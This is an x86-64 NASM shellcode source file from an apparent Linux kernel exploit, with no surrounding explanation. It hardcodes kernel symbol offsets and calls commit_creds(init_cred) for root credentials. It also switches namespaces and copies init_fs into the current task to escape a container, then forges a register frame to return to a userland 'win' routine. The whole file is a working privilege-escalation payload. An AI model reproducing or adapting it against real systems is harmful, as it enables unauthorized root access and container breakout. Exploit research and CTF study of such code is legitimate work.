; nasm -f bin ./shellcode.S && xxd -i shellcode > shellcode.h
BITS 64
  init_cred              equ 0x0e3ab80
  commit_creds           equ 0x00a7b70
  do_symlink_at          equ 0x01e2049
  init_nsproxy           equ 0x0e3a9e0
  switch_task_namespaces equ 0x00a5db0
  init_fs                equ 0x0eb4980
  copy_fs_struct         equ 0x020eeb0
  find_task_by_vpid      equ 0x009f800
  usermode_return        equ 0x801720

_start:
  endbr64
  call a
a:
  pop r15
  sub r15, do_symlink_at

  sub rsp, 8

  ; commit_creds(init_cred)
  lea rdi, [r15 + init_cred]
  lea rax, [r15 + commit_creds]
  call rax

  ; task = find_task_by_vpid(1)
  mov edi, 1
  lea rax, [r15 + find_task_by_vpid]
  call rax

  ; switch_task_namespaces(task, init_nsproxy)
  mov rdi, rax
  lea rsi, [r15 + init_nsproxy]
  lea rax, [r15 + switch_task_namespaces]
  call rax

  ; new_fs = copy_fs_struct(init_fs)
  lea rdi, [r15 + init_fs]
  lea rax, [r15 + copy_fs_struct]
  call rax
  mov rbx, rax

  ; current = find_task_by_vpid(getpid())
  mov rdi, 0x1111111111111111   ; will be fixed at runtime
  lea rax, [r15 + find_task_by_vpid]
  call rax

  ; current->fs = new_fs [8]
  mov [rax + 0x600], rbx

  add rsp, 8

  xor eax, eax
  mov [rsp+0x00], rax ; r15
  mov [rsp+0x08], rax ; r14
  mov [rsp+0x10], rax ; r13
  mov [rsp+0x18], rax ; r12
  mov [rsp+0x20], rax ; rbp
  mov [rsp+0x28], rax ; rbx
  mov [rsp+0x30], rax ; r11
  mov [rsp+0x38], rax ; r10
  mov [rsp+0x40], rax ; r9
  mov [rsp+0x48], rax ; r8
  mov [rsp+0x50], rax ; rax
  mov [rsp+0x58], rax ; rcx
  mov [rsp+0x60], rax ; rdx
  mov [rsp+0x68], rax ; rsi
  mov [rsp+0x70], rax ; rdi

  mov rax, 0x2222222222222222   ; win
  mov [rsp+0x80], rax
  mov rax, 0x3333333333333333   ; cs
  mov [rsp+0x88], rax
  mov rax, 0x4444444444444444   ; rflags
  mov [rsp+0x90], rax
  mov rax, 0x5555555555555555   ; stack
  mov [rsp+0x98], rax
  mov rax, 0x6666666666666666   ; ss
  mov [rsp+0xa0], rax

  lea rax, [r15 + usermode_return]
  jmp rax

  int3
